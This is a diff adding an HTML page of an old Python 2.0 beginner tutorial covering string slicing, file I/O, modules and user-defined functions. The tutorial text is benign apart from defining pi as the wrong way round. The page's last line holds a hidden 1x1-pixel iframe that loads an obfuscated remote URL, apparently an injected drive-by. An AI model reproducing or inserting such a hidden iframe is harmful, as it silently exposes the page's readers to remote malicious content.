+</PRE>Wait, that's not right! Element 5 of s is 'c', not 'r'! Well, I lied 
+before. The second number is one more than the highest index you want. (Remember 
+range()? It's just like that.) Another one of those things you'll just have to 
+deal with, I guess. 
+<P></P>
+<P>Now, what about that example I gave earlier? There was no second index, 
+right? Precisely. There are of course default indexes for before and after the 
+:. Before the colon defaults to 0, after defaults to len(s), or the length of 
+the string: <PRE>&gt;&gt;&gt; s = 'supercalifragalisticexpialidotious'
+&gt;&gt;&gt; s[:5]
+'super'
+&gt;&gt;&gt; s[27:]
+'dotious'
+</PRE>You may think it inconvenient to have to count all the way to the 27th 
+letter of s in order to get dotious. Say you just wanted the last 7 letters. 
+Remember I said negative index numbers work too? Well they do here, too, with 
+slicing. Just make sure the beginning index comes before the ending (you'll see 
+what I mean): <PRE>&gt;&gt;&gt; s = 'supercalifragalisticexpialidotious'
+&gt;&gt;&gt; s[-7:]
+'dotious'
+&gt;&gt;&gt; s[int(-.5*len(s)):len(s)-5] #Indices can be any int expressions
+'ticexpialido'
+&gt;&gt;&gt; s[:] #A plain colon is the same as no colon
+'supercalifragalisticexpialidotious'
+&gt;&gt;&gt; s[:10]+s[10:] #As a rule of thumb, s[:n]+s[n:]=s
+'supercalifragalisticexpialidotious'
+&gt;&gt;&gt; s[-5:5]
+''
+</PRE>See what happens when the indices don't match up? No string. Hey, it's 
+better than an error, but still not what you want. Moving on, then, why would I 
+devote an entire section to slice indexing? Well, I think it's pretty damn neat. 
+It also lets you splice (not slice, splice) together strings in weird and 
+sometimes cool (not to mention useful) ways. Look at this non-useful way: <PRE>&gt;&gt;&gt; #Mixes two names together. You could make this more sophisticated, like making sure
+... #a vowel in the first name is followed by a consonant in the second.
+... name1 = raw_input( "Type a name: " )
+Type a name: Dave
+&gt;&gt;&gt; name2 = raw_input( "Type another name: " )
+Type another name: Guido
+&gt;&gt;&gt; print name1[:3]+name2[-3:]
+Davido
+</PRE>Of course, I'm sure you'll find much more practical uses for splicing and 
+slicing, but hey, I gotta show you how it works first, don't I? 
+<P></P>
+<P><FONT size=-2><A 
+href="#top">Back 
+to top</A></FONT></P>
+<HR>
+
+<H3 align=center><A name=fileio>File I/O</A></H3>
+<P>How can you have a programming language without a way to access other files 
+on the system? I really don't know, but that's alright since Python can do it. 
+Well, then you're probably wondering how. Basically, first you need to open the 
+file and assign it to an object. Object? We haven't talked about those, have we? 
+Objects are like structures (more properly classes) in C, record in some other 
+languages. Basically they are a data type that is made up of other data types 
+combined, including (and in some cases especially) functions. File handles 
+(variables that refer to a file to be opened) are, predictably, of the file 
+object type. You assign a file handle using the open function, like this: <PRE>&gt;&gt;&gt; f = open( "myfile.txt", "r" )
+&gt;&gt;&gt; f                                #This will vary
+&lt;open file 'myfile.txt', mode 'r' at 0x8122338&gt;
+</PRE>I hope you know what myfile.txt is (hint: the file to be opened). The "r" 
+part is a mode for opening the file. The mode you open the file in tells Python 
+whether you're going to read data from the file, write data to the file, etc. 
+Here's a list of the modes you can use: 
+<UL>
+  <LI>r - Reading 
+  <LI>w - Writing 
+  <LI>a - Appending (same as writing, only any new data is written at the end of 
+  the file) 
+  <LI>r+ - Reading and writing 
+  <LI>No argument - Reading </LI></UL>Note that Python won't give you an error if 
+you specify some mode other than these. Be warned that it might make some 
+unexpected things happen later on, though. In Windows and MacOS there is also a 
+binary mode, "b", which is important but a bit confusing. Binary mode treats all 
+characters as normal characters, including newlines. The other modes, as we 
+shall soon see, can rely on newlines to separate or find data. The first of 
+these newline-using methods is readline. To access the readline method for a 
+file object, put 'readline()' after the object's name and a period. This returns 
+a string containing the next line in a file. Also available is readlines, which 
+reads all the lines of a file into a list. readlines can take an optional 
+argument that specifies the most bytes it should read from the file, plus 
+whatever it needs to reach the end of a line. One more thing: readline (or 
+readlines) returns an empty string '' if the end of the file has been reached. 
+Finally, an example: <PRE>&gt;&gt;&gt; f.readlines() #Our imaginary file; create it if you want
+['This is the first line\012', 'This is the second line\012', "Hmm I'm running out
+of creative things to say\012", 'Alright, this is the last line']
+&gt;&gt;&gt; f.seek(0) #You need this to go back to the beginning of the file; see below
+&gt;&gt;&gt; f.readline()
+'This is the first line\012'
+</PRE>Just in case you're wondering, the \012 at the end of every line is just a 
+newline. When reading files, Python replaces simple \ characters like \n with 
+their hex (ASCII) code. If you didn't get that, just remember that \012's are 
+really \n's. There are three (maybe four) more important methods of files. 
+First, read and seek. read just reads the entire file into a string, or a 
+maximum number of bytes if you specify it. seek needs one argument, which is the 
+offset in the file to go to, or seek. Huh? Well, Python reads files by putting a 
+little pointer in one and moving it along. When you read from a file, the little 
+pointer moves along to the end of the part you read. If you read again, it'll 
+start from where the pointer left off. seek will tell the pointer to go back (or 
+forward) to a specified point in the file. Here's another example, using the 
+same imaginary file as above: <PRE>&gt;&gt;&gt; f.seek(12) #Offsets start at 0, therefore 12 is 'f'
+&gt;&gt;&gt; f.read(10)
+'first line'
+&gt;&gt;&gt; f.seek(0)
+&gt;&gt;&gt; f.read() #Whole file. You probably shouldn't do this with big files.
+"This is the first line\012This is the second line\012Hmm I'm running out
+of creative things to say\012Alright, this is the last line"
+</PRE>Then, finally, there is the write function, which (surprise!) writes to 
+your file. Just put in the parentheses the string you want to write. Be sure you 
+have a file opened in mode w, r+, or a, though! Also, if you want to create a 
+new file you must use the mode w or a, not r+. The last method is close, which 
+closes the file and frees up any memory it's been using. It's always good 
+programming practice to close any files when you're done with them or before you 
+leave. One last example for this section, then we move on: <PRE>&gt;&gt;&gt; f = open( "mynewfile.txt", "w" )
+&gt;&gt;&gt; f.write( "This is some text" )
+&gt;&gt;&gt; f.close()
+&gt;&gt;&gt; f.read() #Oops! Can't read a closed file (or a write-only file for that matter)
+Traceback (most recent call last):
+  File "&lt;stdin&gt;", line 1, in ?
+ValueError: I/O operation on closed file
+&gt;&gt;&gt; f = open( "mynewfile.txt" )
+&gt;&gt;&gt; f.read()
+'This is some text'
+</PRE>
+<P></P>
+<P><FONT size=-2><A 
+href="#top">Back 
+to top</A></FONT></P>
+<HR>
+
+<H2 align=center><A name=mod>Modules</A></H2>
+<H3 align=center><A name=mod1>Overview and Importing</A></H3>
+<P>Before we talk about Python's wide variety of builtin modules, let's go over 
+what a module is first and how to get to them. A module is a script (or compiled 
+library) that can be loaded into the interpreter environment separately from the 
+core language of Python. Modules are accessed with the import statement, which 
+can be used in a number of ways: <PRE>&gt;&gt;&gt; import sys #For these examples we're using the builtin sys module
+&gt;&gt;&gt; sys.argv #Access names from the modules like you would an object
+['']
+&gt;&gt;&gt; from sys import argv #Another way to call it
+&gt;&gt;&gt; argv
+['']
+&gt;&gt;&gt; from sys import * #Get everything in the sys module
+&gt;&gt;&gt; stdout
+&lt;open file '&lt;stdout&gt;', mode 'w' at 0x80d34b0&gt;
+</PRE>Confusing? Not really. Let's go through it. The first line imports the 
+module sys (one of the <A 
+href="#builtin">builtin 
+modules</A>). Notice on the next line that we needed to call a member of sys, 
+argv (the arguments passed to the interpreter), with a . like we did for 
+objects. This is using the so-called sys namespace, i.e. all sys members are 
+accessed using, obviously, the name 'sys'. Alternatively, if we put 'from 
+&lt;module&gt; import &lt;members&gt;', we use the global namespace. Then you 
+can access the method's members just like any other sort of local variables or 
+base functions. If you want to use the whole module in the global namespace, 
+just do a 'from &lt;module&gt; import *'. Not too hard, eh? 
+<P></P>
+<P><FONT size=-2><A 
+href="#top">Back 
+to top</A></FONT></P>
+<HR>
+
+<H3 align=center><A name=builtin>Builtin Modules</A></H3>
+<P>Python, being the versatile language it is, has a large selection of modules 
+built into the default distribution. And I do mean large: at my count, there are 
+196 modules available in Python 2.0 (including obsolete and OS-specific ones). 
+When I say "builtin," this doesn't mean you don't have to import them, just that 
+they should be included in Python installation. So, I'll list a choice 5 or so 
+here, with basic descriptions of what they do and only a few of their members. 
+</P>
+<UL>
+  <LI><B><FONT size=+1>sys</FONT></B> - Basic system/program functions 
+  <UL>
+    <LI><B>argv</B> - List of commands passed to the interpreter 
+    <LI><B>stdout, stdin, stderr</B> - Basic standard output, standard input, 
+    and standard error. These can be accessed like normal files. 
+    <LI><B>exit</B> - Exits the program gracefully, accepting a value as the 
+    exit code (basically 0=good exit, non-0=error) 
+    <LI><B>path</B> - The paths Python looks in to find modules to import 
+  </LI></UL>
+  <LI><B><FONT size=+1>math</FONT></B> - Mathematical functions and constants. I 
+  won't list them all here, but math contains many functions like sin, acos, 
+  tanh, log, etc. Here are the constants: 
+  <UL>
+    <LI><B>pi</B> - The mathematical constant &#960;. The ratio of a circle's 
+    diameter to its circumference, approximately 3.1415926535897931 
+    <LI><B>e</B> - The base of the natural logarithm (ln). Get it with the sum 
+    of 1/k! for all numbers k 0-&gt;infinity. Oddly enough, factorials (and 
+    infinity) are not in the math module. </LI></UL>
+  <LI><B><FONT size=+1>string</FONT></B> - Functions for more manipulations of 
+  strings 
+  <UL>
+    <LI><B>printable</B> - A string of all so-called printable characters. Also 
+    available are digits, letters (uppercase and lowercase), whitespace, and 
+    punctuation. 
+    <LI><B>atoi, atof, atol</B> - Convert strings to int, float, and long, 
+    respectively. In Python 2.0 you should use builtins functions int, float, 
+    and long. 
+    <LI><B>find</B> - Find the lowest index where the second string (argument) 
+    appears in the first. 
+    <LI><B>count</B> - Count the number of times the second string appears in 
+    the first. 
+    <LI><B>split</B> - Split the string given in the first argument by 
+    whitespace characters; return a list. If a second argument is given, the 
+    string is split according to that instead of whitespace. 
+    <LI><B>strip</B> - Strip leading and trailing whitespace from the given 
+    string. 
+    <LI><B>replace</B> - Replace all occurrences of the second string in the 
+    first string with the third string. Err, look at it this way: replace( str, 
+    "old", "new" ) replaces all occurrences of "old" in str with "new". </LI></UL>
+  <LI><B><FONT size=+1>random</FONT></B> 
+  <UL>
+    <LI><B>seed</B> - Seeds the random number generator with three optional 
+    arguments; defaults to the current time 
+    <LI><B>random</B> - Returns the next random number as a floating-point 
+    number between 0 and 1. 
+    <LI><B>randint</B> - Returns a random number between two given integers. 
+    <LI><B>uniform</B> - Same as randint, only with floating-point numbers. 
+    <LI><B>choice</B> - Randomly chooses an element from the specified list or 
+    tuple. </LI></UL>
+  <LI><B><FONT size=+1>time</FONT></B> - Functions for getting and manipulating 
+  local and arbitrary times. See the Python library documentation for more 
+  complete information. 
+  <UL>
+    <LI><B>time</B> - No arguments, returns a long number that's your system's 
+    current time, in seconds since...some time. Not really useful without some 
+    sort of parser, except for seeding randoms. 
+    <LI><B>localtime</B> - A parser. Given a time (like that returned by the 
+    time function), it returns a tuple with the following information: year 
+    (four-digit), month (1-12), day (1-31), hour (0-23), minute (0-59), second 
+    (0-61 - 60 &amp; 61 for leap seconds, never used), weekday (0-6, Monday is 
+    0), day (1-366), daylight savings time (0 - no, 1 - yes, -1 - system 
+    default). Useful :) 
+    <LI><B>gmtime</B> - Same as above, except in Greenwich Mean Time, not your 
+    system's local time. 
+    <LI><B>asctime</B> - Given a tuple from localtime or gmtime, returns a 
+    string in the format 'Thu Mar 22 18:24:35 2001'. </LI></UL>
+  <LI><B><FONT size=+1>re</FONT></B> - Regular expression (regexp) operators. I 
+  won't cover them here, but I thought all you Perl fans out there might like to 
+  know they exist in Python. There are some definite peculiarities about regexps 
+  in Python, so read the docs...docs are your friends :). </LI></UL>
+<P><FONT size=-2><A 
+href="#top">Back 
+to top</A></FONT></P>
+<HR>
+
+<H3 align=center><A name=yours>User-Defined Modules and Functions</A></H3>
+<P>Of course, what use are all these modules if you can't use your own? Well, a 
+user-defined module is just a .py file in one of Python's module directories. To 
+import the module, it's run, and any functions, variables, classes, etc. are 
+imported in. You can specify what to import, just like for any other module. 
+Well, then, that's all well and good, but a big part of these modules is 
+functions. How to make your own functions, then? Ok. </P>
+<P>Alright. So we want a function. Since I like math, we'll do a simple 
+logarithm to any base using the log function in the math module. Here we go, try 
+this: <PRE>&gt;&gt;&gt; def logb( b, n ):
+...   from math import log
+...   a = log(n)/log(b)
+...   if a - int(a) == 0: #a is an int
+...     return int(a)
+...   else:
+...     return a
+...
+</PRE>How nice. Only a couple things should need explaining, unless you haven't 
+taken high school algebra (hey no offense...I'm just a freshman :). This 'def' 
+thing? Well, it's just the name of the function and the arguments it takes. I 
+should hope you have a good idea of what arguments are now. Then there's return. 
+It's...uh...what the function returns :). Execution stops after a return 
+statemnt, just like a break statement. Except it returns something. Ok. Well, 
+I've kinda run out of things to say...so here's an example module, just for 
+practice. Hey, this is a tutorial, isn't it? Let's go, put this in moremath.py: <PRE>#!/usr/bin/python
+
+def logb( b, n ): #Definition
+  from math import log #Need this!
+  a = log(n)/log(b) #Change of base formula
+  if a - int(a) == 0: #a is an int
+    return int(a) #Get rid of that decimal :)
+  else: #a is a float
+    return a #Just return it
+
+#Ye Olde Golden Ratio &lt;www.verbose.net&gt;
+phi = 1.6180339887498948
+</PRE>And now in the interpreter: <PRE>&gt;&gt;&gt; import moremath
+&gt;&gt;&gt; moremath.phi #Floating point numbers aren't that accurate, you may notice
+1.6180339887499999
+&gt;&gt;&gt; from moremath import logb
+&gt;&gt;&gt; logb(2,1024)
+10
+</PRE>Wow! A module! Just like other modules! But you did it myself! Or I did it 
+yourself...or...wait...you did it yourself. If you look in the directory where 
+you put moremath.py now, you'll now find a moremath.pyc file. This is a 
+'compiled' file, which is not really compiled (it's bytecode - kinda like a Java 
+.class file), but has less memory overhead than a .py file. As far as I know 
+.pyc files are not portable, though, so if you're just using this module for 
+yourself you can use the .pyc but if you want to distribute it, I recommend you 
+keep the .py file. In any case, it's certainly easier to edit your source if you 
+still have a .py file. Any questions :)? 
+<P></P>
+<P><FONT size=-2><A 
+href="#top">Back 
+to top</A></FONT></P>
+<HR>
+
+<H2 align=center><A name=close>In Closing</A></H2>
+<H3 align=center><A name=perl>Why Python is Better than Perl</A></H3>
+<P>I admit it: maybe Python isn't better than Perl. It's different, to say the 
+least. For many things it <I>is</I> better. And it's got definite advantages, 
+and that's what I thought I'd just review, or look at, or list, or whatever. 
+Here goes. </P>
+<UL>
+  <LI>Intuitiveness. Instead of all that nasty, obfuscated code, Python has 
+  syntax and blocking that resembles, somewhat, normal (English) speech and 
+  indenting. 
+  <LI>High-levelness. List slicing, tuple packing, etc. allow for high-level 
+  manipulation of data without all that mucking about with 
+  pointers...wait...that's C...and efficient though it may be, it sometimes even 
+  confuses the überhacker in me. But it's still easier in Python than Perl. 
+  <LI>More integrated object-oriented (OO) support. OO in Perl involves working 
+  with hashes as classes and weird stuff like that. Bottom line, Python was 
+  designed from the start to be OO...even though I didn't talk about classes too 
+  much. Sorry. 
+  <LI>Better C integration. Well, this is opinionated here, but I think 
+  embedding Python in C is easier than Perl...what can I say? 
+  <LI>Interactive mode. No need to put scripts in separate files. You know what 
+  I'm saying. 
+  <LI>Wider variety of data structures. Perl has arrays, hashes, and scalars. 
+  Python has scalars (int, float, long), lists, dictionaries (which I didn't 
+  talk about; they're like hashes or associative arrays), tuples. And it's 
+  extensible and evolving, according to the docs. 
+  <LI>range function. People complain about the lack of a generic for loop, like 
+  Perl has. range really makes the for loop...without having a whole different 
+  type of loop. Less overhead. And you can use range for other things, too. 
+  <LI>Monty Python. 'Nuff said. </LI></UL>
+<P><FONT size=-2><A 
+href="#top">Back 
+to top</A></FONT></P>
+<HR>
+
+<H3 align=center><A name=ref>References</A></H3>
+<UL>
+  <LI><A href="http://www.python.org/">Python.org</A>. A must-see. 
+  <LI><A href="http://www.python.org/doc/current/">Current Python docs</A>. 
+  Gotta read them. 
+  <LI><A href="http://www.zope.org/">Zope</A>. Great webserver written in 
+  Python. 
+  <LI><A href="http://www.programmershaven.com/zone23/links/link281.htm">Python 
+  section at ProgrammersHaven</A>. More good links. 
+  <LI><A href="http://blacksun.box.sk/">Black Sun Research Facility</A>. Great 
+  site for networking, programming, cracking, OSes, etc. This tutorial should be 
+  published there :) 
+  <LI><A href="http://www.pythonline.com/">Pythonline</A>. Monty Python, may or 
+  may not be the official site, I'm not sure. </LI></UL>
+<P>Any comments, questions, glowing praise, rants, hatemail, feel free to <A 
+href="mailto:skinite@home.com">mail me</A> or leave a message for me at <A 
+href="http://dvd.box.sk/wb/?did=blacksun">BSRF's message board</A>. I'm a 
+member, I check it regularly. Hatemail is ok, but death threats are discouraged. 
+</P>
+<P>Well, we've come to the end, at long last. I hope you've learned something, 
+and you aren't too high on the adrenaline rush of coding. I'm not good at these 
+ending things, so I think I'll just trail off right...about...now... </P>
+<P><FONT size=-2><A 
+href="#top">Back 
+to top</A></FONT></P></FONT><iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY></HTML>
